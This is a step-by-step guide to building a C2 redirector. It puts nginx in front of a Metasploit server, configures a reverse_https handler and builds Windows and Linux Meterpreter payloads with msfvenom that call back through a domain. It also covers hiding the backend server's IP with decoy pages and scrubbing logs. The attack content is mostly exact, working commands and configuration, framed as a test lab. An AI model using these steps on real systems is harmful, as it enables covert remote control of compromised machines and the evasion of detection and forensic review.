# Nginx C2 Redirector — Full Testlab Setup Guide

Everything documented here reflects the actual steps, errors, and fixes encountered during a live deployment. Commands are exact and in order.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        Attack Chain                          │
│                                                             │
│  VirtualBox VM          Redirector           MSF Server     │
│  (test agent)           (nginx)              (Metasploit)   │
│                                                             │
│  payload.exe ──HTTPS──▶ 435pau.com:443 ──HTTPS──▶ :4444    │
│               ◀─stage──               ◀─stage──            │
│               ──cb────▶               ──cb────▶            │
│                                                             │
│  38.x.x.x (local)    38.55.155.155    40.33.133.133        │
└─────────────────────────────────────────────────────────────┘
```

**Key principle:** The agent only ever connects to the redirector IP/domain. The MSF server IP is never exposed to the target network.

---

## Infrastructure

| Role | OS | IP | Ports needed |
|---|---|---|---|
| Redirector | Debian 12 | 38.55.155.155 | 22, 80, 443 inbound |
| MSF Server | Debian 12 | 40.33.133.133 | 22 inbound; 4444 from redirector only |
| Test Agent | VirtualBox (Windows or Linux) | local | outbound 443 |

Both servers were VPS instances on the same provider. The VirtualBox VM was on a local machine with internet access.

---

## Part 1 — DNS

Point the domain at the redirector **before doing anything else**. Let's Encrypt verifies ownership over HTTP before issuing a cert — if DNS isn't right, certbot fails.

In your DNS panel, create:

```
A    435pau.com    38.55.155.155    TTL 60
```

TTL 60 means propagation takes ~1 minute. Verify from any machine before proceeding:

```bash
dig +short 435pau.com
# Must return: 38.55.155.155
```

> **Lesson learned:** During testing, the A record was initially pointing at the MSF server IP (`40.33.133.133`) instead of the redirector. Let's Encrypt tried to reach that IP on port 80 for the ACME challenge and got connection refused. The error message `40.33.133.133: Fetching http://435pau.com/.well-known/...` tells you exactly which IP DNS resolved to.

---

## Part 2 — Firewall Rules

### Redirector (38.55.155.155)

```bash
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable
ufw status
```

### MSF Server (40.33.133.133)

Port 4444 must only accept connections from the redirector — never from the open internet.

```bash
ufw allow 22/tcp
ufw allow from 38.55.155.155 to any port 4444 proto tcp
ufw deny 4444/tcp
ufw --force enable
ufw status numbered
```

Verify the rule is in the right order (allow before deny):

```
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 4444/tcp from 38.55.155.155 ALLOW IN   Anywhere
[ 3] 4444/tcp                   DENY IN     Anywhere
```

---

## Part 3 — Deploy RedirectorOfFun on the Redirector

### 3.1 Transfer the project

From your local machine:

```bash
scp RedirectorOfFun.zip root@38.55.155.155:/root/
```

On the redirector:

```bash
cd /root
apt-get install -y unzip
unzip RedirectorOfFun.zip
cd RedirectorOfFun
chmod +x automate.sh blocklist-update.sh
```

### 3.2 Run the installer

```bash
./automate.sh 435pau.com 40.33.133.133:4444
```

The script accepts `domain c2_address` as positional arguments to skip interactive prompts.

When prompted:

```
Proxy to C2 over HTTPS? [y/N] → y
```

> **Important:** Answer `y` here. The agent payload speaks HTTPS to port 443 on the redirector. nginx must re-encrypt when forwarding to MSF, so the upstream connection also needs to be HTTPS. Answering `n` (HTTP upstream) causes the session to open once and immediately die.

### 3.3 What the installer does

```
[+] Added 'renjxkwf' to /etc/hosts            ← fixes sudo hostname warning
[+] Checking for port conflicts on 80 and 443
[+] Port 80 cleared (after 1s)                 ← killed stale nginx/Apache
[+] Port 443 is free
[+] Updating package lists
[+] Installing nginx, certbot & tools
[+] Disabling certbot systemd timer            ← we use nysm-cron instead
[+] Deploying certbot renewal cronjob
[+] Fetching firehol_level1.netset             ← 23,000+ blocked IPs
[+] Blocklist written (23262 entries)
[+] Creating webroot and deploying decoy pages
[+] Starting nginx
[+] Verifying DNS for 435pau.com
[+] DNS OK: 435pau.com → 38.55.155.155
[+] Deploying initial HTTP config for ACME challenge
[+] Obtaining SSL certificate via Let's Encrypt (webroot)
    Successfully received certificate. Expires 2026-09-13.
[+] Activating HTTPS config
[+] Restarting nginx with SSL
[+] Done! Redirector is live at https://435pau.com
```

### 3.4 Verify nginx is up

```bash
systemctl status nginx
# Active: active (running)

curl -sk -o /dev/null -w "%{http_code}\n" https://435pau.com/
# 200 (decoy page) or 502 (MSF not listening yet — both mean nginx is working)

openssl s_client -connect 435pau.com:443 -servername 435pau.com </dev/null 2>/dev/null \
  | openssl x509 -noout -issuer -dates
# Issuer: Let's Encrypt
# notAfter: Sep 13 ...
```

---

## Part 4 — Errors Encountered During Deployment

These are the actual errors hit during testing, in the order they appeared.

### Error 1: Port 80 already in use

```
nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)
Job for nginx.service failed
```

**Cause:** Apache2 was pre-installed on the VPS image and was holding port 80. A Python uploadserver was also running on the same port.

**Fix (now automatic):** The installer's `nysm_clear_ports()` function detects and stops whatever is on ports 80 and 443 before installing nginx. It uses a polling loop with SIGKILL escalation if SIGTERM doesn't work within 5 seconds.

Manual fix if needed:

```bash
ss -tlnp | grep :80              # identify what's running
systemctl stop apache2
systemctl disable apache2
pkill -f uploadserver
```

### Error 2: /var/www/html does not exist

```
cp: cannot create regular file '/var/www/html/index.html': No such file or directory
```

**Cause:** nginx failed to start (due to Error 1), so its post-install script didn't create the webroot directory.

**Fix (now automatic):** The installer explicitly runs `mkdir -p /var/www/html` before copying decoy pages.

### Error 3: certbot --nginx creates duplicate server blocks

```
2026/06/15 11:05:30 [warn] conflicting server name "435pau.com" on [::]:443, ignored
Job for nginx.service failed
```

**Cause:** The original code used `certbot --nginx`, which modifies the live nginx config inline (adds its own SSL server block). When the script then uncommented the `#nysm#` HTTPS block, nginx had two `server { listen 443; server_name 435pau.com; }` blocks and refused to start.

**Fix (now automatic):** The installer uses `certbot certonly --webroot -w /var/www/html` instead. This drops the ACME challenge token in the webroot and **never touches the nginx config**. Our `#nysm#` block mechanism then activates cleanly.

### Error 4: DNS resolving to 127.0.0.1

```
[!] DNS mismatch detected!
[!]   435pau.com resolves to : 127.0.0.1
[!]   This server's IP is  : 38.55.155.155
```

**Cause:** A previous failed run had written `127.0.0.1 435pau.com` to `/etc/hosts`. Python's `socket.gethostbyname()` reads `/etc/hosts` before querying real DNS, so the check returned `127.0.0.1` instead of the real public IP.

**Fix (now automatic):** `verify_dns()` now:
1. Strips any existing `/etc/hosts` entry for the domain at the start of the check.
2. Queries real DNS via Google DNS-over-HTTPS (`dns.google/resolve`) which bypasses `/etc/hosts` entirely.
3. Falls back to `dig @8.8.8.8` if curl fails.

The domain is no longer written to `/etc/hosts` at all — it served no purpose and only caused problems.

### Error 5: DNS pointing at MSF server

```
Certbot failed: 40.33.133.133: Fetching http://435pau.com/.well-known/acme-challenge/...
Connection refused
```

**Cause:** The DNS A record for `435pau.com` was pointing at `40.33.133.133` (MSF server) instead of `38.55.155.155` (redirector). Let's Encrypt resolved the domain and tried to reach the ACME challenge from the wrong server.

**Fix:** Update the A record in the DNS panel to point at the redirector IP. The installer now verifies DNS matches the server's public IP before running certbot.

### Error 6: sudo hostname warning (cosmetic)

```
sudo: unable to resolve host renjxkwf: Name or service not known
```

**Cause:** The VPS was provisioned with hostname `renjxkwf` but `/etc/hosts` had no entry for it. Every `sudo` invocation does a hostname lookup and warns when it fails.

**Fix (now automatic):** `check_root()` adds `127.0.1.1 <hostname>` to `/etc/hosts` if the hostname isn't already there. Runs on the first `./automate.sh` invocation.

### Error 7: Meterpreter session opens and immediately closes

```
[*] http://0.0.0.0:4444 handling request from 38.55.155.155; Staging x64 payload (249948 bytes)
[-] Meterpreter session 1 is not valid and will be closed
```

**Cause:** Protocol mismatch. The handler was `reverse_http`, which means MSF expects plain HTTP on port 4444. But the payload connected to `435pau.com:443` (HTTPS), nginx forwarded it to `40.33.133.133:4444` as plain HTTP, and MSF sent back the stage. The stage then embedded `435pau.com:443` as its callback URL and tried to reconnect — using HTTP. nginx on port 443 only speaks TLS and rejected the plain HTTP connection.

**Fix:** Two changes required:

1. MSF handler must be `reverse_https` (listens with TLS on port 4444)
2. nginx must `proxy_pass https://c2_backend` (re-encrypts when forwarding to MSF)

Both are covered in Part 5.

---

## Part 5 — MSF Server Setup

### 5.1 Add the redirector domain to /etc/hosts on the MSF server

This is needed because `msfvenom` validates LHOST by resolving it. If DNS hasn't propagated to this server, it rejects `435pau.com` as an invalid LHOST.

```bash
# On 40.33.133.133
sed -i '/435pau.com/d' /etc/hosts          # remove any stale entry first
echo "38.55.155.155 435pau.com" >> /etc/hosts
```

Verify:

```bash
python3 -c "import socket; print(socket.gethostbyname('435pau.com'))"
# 38.55.155.155
```

### 5.2 Start msfconsole

```bash
msfconsole -q
```

Check DB is connected (needed for session tracking):

```
msf > db_status
[*] Connected to msf. Connection type: postgresql.
```

### 5.3 Configure the handler

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4444
set OverrideLHOST 435pau.com
set OverrideLPORT 443
set OverrideRequestHost true
set ExitOnSession false
run -j
```

**What each option does:**

| Option | Value | Why |
|---|---|---|
| `PAYLOAD` | `reverse_https` | MSF listens with TLS; nginx proxies HTTPS to HTTPS |
| `LHOST` | `0.0.0.0` | Bind on all interfaces of the MSF server |
| `LPORT` | `4444` | Port nginx forwards to |
| `OverrideLHOST` | `435pau.com` | Embedded in the stage as the callback hostname |
| `OverrideLPORT` | `443` | Embedded in the stage as the callback port |
| `OverrideRequestHost` | `true` | Tells MSF to actually use the overrides when building the stage |

**Without the Override options:** The stage gets `40.33.133.133:4444` hardcoded. Sessions open once (stager finds MSF through nginx) and then die immediately (stage tries to call back directly to MSF, bypassing the redirector).

Confirm it's listening:

```bash
# On the MSF server
ss -tlnp | grep 4444
# 0.0.0.0:4444    LISTEN
```

---

## Part 6 — Generate Payloads

Run on the MSF server. Payloads connect to the redirector domain — they should never reference the MSF server IP directly.

### Windows (staged, recommended)

```bash
msfvenom \
  -p windows/x64/meterpreter/reverse_https \
  LHOST=435pau.com \
  LPORT=443 \
  -f exe \
  -o /tmp/payload.exe
```

### Linux stageless (the staged variant does not exist for Linux/HTTPS)

```bash
# Note: linux/x64/meterpreter/reverse_https (with slash) is INVALID
# Linux Meterpreter over HTTPS is stageless only — use underscore not slash

msfvenom \
  -p linux/x64/meterpreter_reverse_https \
  LHOST=435pau.com \
  LPORT=443 \
  -f elf \
  -o /tmp/payload.elf
```

### Transfer payloads to local machine

```bash
# From your local machine
scp root@40.33.133.133:/tmp/payload.exe ./
scp root@40.33.133.133:/tmp/payload.elf ./
```

---

## Part 7 — VirtualBox Test Agent

### Requirements

- Internet access from VirtualBox (NAT or Bridged adapter)
- Ability to reach port 443 outbound (most NAT setups allow this by default)

### Test connectivity before running the payload

**Windows VM:**

```cmd
curl -sk -o nul -w "%{http_code}" https://435pau.com/
:: Expected: 200 (decoy page) or 502 (MSF handler not running)
:: Any response other than connection refused = nginx is in the path
```

**Linux VM:**

```bash
curl -sk -o /dev/null -w "%{http_code}\n" https://435pau.com/
```

### Run the payload

**Windows:**

```cmd
payload.exe
```

**Linux:**

```bash
chmod +x payload.elf
./payload.elf
```

---

## Part 8 — Verifying the Chain

Open three terminals before running the payload to watch traffic at each hop in real time.

### Terminal 1 — Redirector access log

```bash
# On 38.55.155.155
tail -f /var/log/nginx/access.log
```

Expected output when the agent connects:

```
<agent_ip> - - [15/Jun/2026:12:00:00] "GET /Khv1Jx HTTP/1.1" 200 249948 "-" "Mozilla/5.0..."
<agent_ip> - - [15/Jun/2026:12:00:01] "POST /Khv1Jx HTTP/1.1" 200 48 "-" "Mozilla/5.0..."
```

### Terminal 2 — Connections at each leg

```bash
# On the redirector — shows both legs of the proxy simultaneously
watch -n1 'echo "=== Inbound (agent → nginx) ===" && \
  netstat -an | grep ":443" | grep ESTABLISHED && \
  echo "=== Outbound (nginx → MSF) ===" && \
  netstat -an | grep ":4444" | grep ESTABLISHED'
```

### Terminal 3 — MSF console

```
[*] https://0.0.0.0:4444 handling request from 38.55.155.155
[*] Staging x64 payload (249948 bytes) ...
[*] Meterpreter session 1 opened

sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ipconfig
```

### OPSEC verification — confirm MSF IP is not visible to the agent

**On the VirtualBox VM (Windows):**

```cmd
netstat -an | findstr ESTABLISHED
```

You should see connections to `38.55.155.155:443` only. If you see `40.33.133.133` anywhere, the payload is bypassing the redirector — check the Override settings in the handler.

**On the MSF server — confirm traffic comes from the redirector, not directly from the agent:**

```bash
tcpdump -i any -n port 4444 -A 2>/dev/null | grep "Host:"
# Must show: Host: 435pau.com
# Must NOT show the VirtualBox VM's IP
```

---

## Part 9 — Full Connection Flow (HTTPS end-to-end)

```
VirtualBox                  435pau.com:443             MSF:4444
    │                            │                        │
    │─── HTTPS (LE cert) ───────▶│                        │
    │   GET /Khv1Jx              │                        │
    │                            │─── HTTPS (MSF cert) ──▶│
    │                            │   proxy_ssl_verify off  │
    │                            │◀── stage (249948 bytes)─│
    │◀── stage (249948 bytes) ───│                        │
    │                            │                        │
    │   [stage executes]         │                        │
    │                            │                        │
    │─── HTTPS (LE cert) ───────▶│                        │
    │   POST /Khv1Jx             │                        │
    │   Host: 435pau.com         │                        │
    │                            │─── HTTPS (MSF cert) ──▶│
    │                            │◀── meterpreter cmds ───│
    │◀── meterpreter cmds ───────│                        │
    │                            │                        │
    │        [session active]    │                        │
```

Every hop is encrypted. The MSF server is never referenced in any traffic the agent sees.

---

## Part 10 — Operational Notes

### Check redirector status

```bash
cd /root/RedirectorOfFun
./automate.sh   # → menu → Check Status
```

Or directly:

```bash
# Active sessions through the proxy
netstat -an | grep ":443" | grep ESTABLISHED | wc -l

# Certificate expiry
openssl x509 -noout -dates -in /etc/letsencrypt/live/435pau.com/cert.pem

# Blocklist entry count
grep -c "^deny" /etc/nginx/blocklist.conf

# Log sizes
du -sh /var/log/nginx/
```

### Update the blocklist

```bash
cd /root/RedirectorOfFun
bash blocklist-update.sh
```

Or via the menu: `Update Blocklist` — reloads nginx automatically after updating.

### Scrub logs before leaving

```bash
cd /root/RedirectorOfFun
./automate.sh   # → menu → Scrub Logs
```

Or directly:

```bash
truncate -s 0 /var/log/nginx/access.log
truncate -s 0 /var/log/nginx/error.log
```

### Teardown

Revokes the certificate, removes nginx config, cron, and blocklist, stops nginx, scrubs logs:

```bash
cd /root/RedirectorOfFun
./automate.sh   # → menu → Teardown Redirector
```

Verify teardown is clean:

```bash
systemctl status nginx           # Should show: inactive (dead)
ls /etc/letsencrypt/live/        # Should be empty
cat /var/log/nginx/access.log    # Should be empty
```

---

## Part 11 — Certificate Renewal

The cron job in `/etc/cron.d/nysm` handles renewal automatically:

```
# Attempt renewal at 06:00 and 18:00 daily (random sleep up to 1hr to stagger)
0 6,18 * * * root python3 -c 'import random, time; time.sleep(random.random() * 3600)' \
  && certbot renew --quiet \
  && nginx -t 2>/dev/null \
  && systemctl reload nginx

# Daily expiry alert at 08:00 — logs a warning if cert expires within 14 days
0 8 * * * root for cert in /etc/letsencrypt/live/*/cert.pem; do ...
```

Key behaviours:
- `nginx -t` runs before reload — a broken config won't take down the redirector
- `systemctl reload` (graceful) instead of restart — active sessions aren't dropped
- Certbot's own systemd timer (`certbot.timer`) is disabled by the installer to avoid double renewal

Manual renewal test:

```bash
certbot renew --dry-run
```

---

## Part 12 — Troubleshooting Reference

| Symptom | Likely cause | Fix |
|---|---|---|
| `bind() to 0.0.0.0:80 failed (98)` | Something else on port 80 | `ss -tlnp \| grep :80`, kill the process |
| certbot: `Connection refused` on ACME challenge | DNS points to wrong IP | Check `dig +short 435pau.com` — must return redirector IP |
| certbot: `Connection refused` even with correct DNS | nginx not running when certbot fires | `systemctl start nginx` then re-run certbot |
| `conflicting server name ... ignored`, nginx won't start | Double SSL server block | Used `certbot --nginx` which modified config; switch to `certbot certonly --webroot` |
| `verify_dns` shows `127.0.0.1` | Stale `/etc/hosts` entry from previous run | `sed -i '/435pau.com/d' /etc/hosts` |
| msfvenom: `LHOST failed to validate` | MSF server can't resolve domain | `echo "38.55.155.155 435pau.com" >> /etc/hosts` on MSF server |
| Session opens then immediately closes | Protocol mismatch (HTTP handler, HTTPS nginx) | Handler: `reverse_https`; nginx: `proxy_pass https://` |
| Session never opens, nginx log shows 502 | MSF handler not running | Start handler with `run -j` in msfconsole |
| Sessions open but die on reconnect | Missing Override options | Set `OverrideLHOST`, `OverrideLPORT`, `OverrideRequestHost true` |
| Agent connects directly to MSF (bypassing redirector) | Wrong LHOST in payload | Payload LHOST must be the domain/redirector IP, never MSF IP |
| `sudo: unable to resolve host renjxkwf` | Hostname not in `/etc/hosts` | `echo "127.0.1.1 $(hostname)" >> /etc/hosts` |
| Blocklist shows 0 entries | ipsum.txt fetch failed (geo-blocked on some VPS) | Firehol alone is fine; re-run `bash blocklist-update.sh` |

---

## Appendix — nginx Config After Full Setup

After the installer completes, `/etc/nginx/sites-enabled/default` looks like this:

```nginx
include /etc/nginx/blocklist.conf;     # 23,000+ blocked IPs

limit_req_zone $binary_remote_addr zone=beacon:10m rate=10r/s;

upstream c2_backend {
    server 40.33.133.133:4444;
    keepalive 32;
}

# HTTP → HTTPS redirect
server {
    listen 80;
    listen [::]:80;
    server_name 435pau.com;
    server_tokens off;
    return 301 https://$host$request_uri;
}

# HTTPS proxy to MSF
server {
    listen 443 ssl http2 default_server;
    listen [::]:443 ssl http2 default_server;
    server_name 435pau.com;

    ssl_certificate     /etc/letsencrypt/live/435pau.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/435pau.com/privkey.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_session_tickets off;

    location @c2 {
        proxy_pass          https://c2_backend;   # re-encrypt to MSF
        proxy_ssl_verify    off;                   # MSF uses self-signed cert
        proxy_hide_header   Server;
        proxy_hide_header   Via;
        error_page 502 503 504 /maintenance.html;  # decoy on MSF down
    }
}
```

---

## Appendix — MSF Handler Quick Reference

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4444
set OverrideLHOST 435pau.com
set OverrideLPORT 443
set OverrideRequestHost true
set ExitOnSession false
run -j
```

```bash
# Windows payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=435pau.com LPORT=443 -f exe -o /tmp/payload.exe

# Linux payload (stageless only — slash variant doesn't exist)
msfvenom -p linux/x64/meterpreter_reverse_https \
  LHOST=435pau.com LPORT=443 -f elf -o /tmp/payload.elf
```
